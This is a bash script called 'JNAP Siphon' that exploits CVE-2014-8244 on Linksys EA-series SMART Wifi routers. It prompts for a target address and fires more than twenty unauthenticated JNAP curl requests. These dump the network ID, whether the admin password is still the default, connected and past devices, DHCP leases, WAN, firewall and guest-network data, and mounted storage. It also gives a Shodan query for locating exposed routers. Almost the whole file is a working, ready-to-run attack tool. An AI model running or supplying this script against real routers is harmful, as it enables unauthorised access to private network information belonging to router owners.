#!/usr/bin/env bash

NON=$(echo -e "\e[0;0;0m")  #Revert fonts to standard color
REDB=$(echo -e "\e[1;91m")  #Alter fonts to red bold
GRNB=$(echo -e "\e[1;92m")  #Alter fonts to green bold
GRN=$(echo -e "\e[1;32m")  #Alter fonts to green bold
BLU=$(echo -e "\e[1;97m")  #Alter fonts to blue normal
YEL=$(echo -e "\e[1;99m")  #Alter fonts to blue bold
############################################################################
echo ''
echo ''
echo $REDB"===============================================$NON"
echo $REDB"------------JNAP Siphon 0.1c-------------------$NON"
echo $REDB"===============================================$NON"
echo ''
echo -e $YEL"CVE-2014-8244 - Devices - EA2700, EA3500, E4200v2, EA4500, EA6200, EA6300, EA6400, EA6500, EA6700 and EA6900\n\tOn Linksys EA series Routers with SMART Wifi firmware, certain JNAP HTTP requests can allow remote attackers to obtain sensitive information or even modify data. How much information??? Let's see....\n\n\tShodan search - title:'Linksys SMART'\n\thttp://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-8244\n\tDisclosed November, 2014 $NON"
echo ''
echo ''
############################################################################
read -p $BLU"Enter the target Smart Linksys Router (w/o trailing slash - http://10.0.0.1): $NON" T
echo ""
echo $GRNB"Target is set to:$NON$BLU $T $NON"
############################################################################
echo -e $GRNB"=================================================================================$NON"
echo ''
echo -e $BLU"Checking for users Network ID....$NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://linksys.com/jnap/ownednetwork/GetOwnedNetworkID"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Is the admin password still default (admin/admin)?$NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/core/IsAdminPasswordDefault"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Let's see all the devices that have ever been on the router $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/devicelist/GetDevices"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"LAN Settings $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/router/GetLANSettings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"How about WAN Settings $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/router/GetWANStatus"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"DHCP Client Leases....$NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/router/GetDHCPClientLeases"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Network Connections $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/networkconnections/GetNetworkConnections"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"UPNP Settngs $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/routerupnp/GetUPnPSettings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Management Settings $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/routermanagement/GetManagementSettings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"ALG Settings $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/firewall/GetALGSettings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Time Settings $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/locale/GetTimeSettings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Router LED Settings $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/routerleds/GetRouterLEDSettings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Firmware Update Settings $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/firmwareupdate/GetFirmwareUpdateSettings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Checking for users Network ID....$NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/core/GetAdminPasswordRestrictions"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Checking for users Network ID....$NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/core/GetDeviceInfo"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"IPv6 Settings $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/router/GetIPv6Settings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"More Router Settings $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/router/GetRoutingSettings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Ethernet Port Connections $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/router/GetEthernetPortConnections"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Parental Control Settings$NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/parentalcontrol/GetParentalControlSettings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"QoS Settings $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/qos/GetQoSSettings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"WLAN QoS Settings $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/qos/GetWLANQoSSettings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Firewall Settings $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/firewall/GetFirewallSettings"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Supported DDNS Providers $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/ddns/GetSupportedDDNSProviders"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"DDNS Status....$NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/ddns/GetDDNSStatus"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Guest Network Clients $NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/guestnetwork/GetGuestNetworkClients"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Any mounted partions?$NON"
echo ''
curl -skL "$T/JNAP/" --connect-timeout 3 -d "{}" -H "X-JNAP-ACTION: http://cisco.com/jnap/storage/GetMountedPartitions"
sleep 2
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
echo ''
echo -e $BLU"Well, that sucked, right? $NON"
echo -e $REDB"-------------------------------------------------------------------------------------- $NON"
